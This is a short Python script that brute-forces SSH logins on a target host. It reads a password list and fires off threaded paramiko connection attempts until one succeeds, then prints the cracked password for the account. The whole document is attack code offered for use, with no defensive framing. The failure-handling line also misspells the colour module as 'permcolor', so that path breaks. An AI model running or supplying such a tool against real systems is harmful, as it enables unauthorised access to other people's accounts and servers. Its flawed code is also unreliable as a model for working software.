import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found password: ' + password + ' , For account: ' + username), 'green'))
    except:
        print(permcolor.colored(('[-] Incorrect login: ' + password), 'red'))
    ssh.close()


host = input('[+] Target address: ')
username = input('[+] SSH username: ')
input_file = input('[+] Passwords file: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!] That file/path does not exist')
    sys.exit(1)

print(' * * * Starting threaded SSH bruteforce on ' + host + ' With account: ' + username + '* * *')

#read password in the line
with open(input_file, 'r')as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
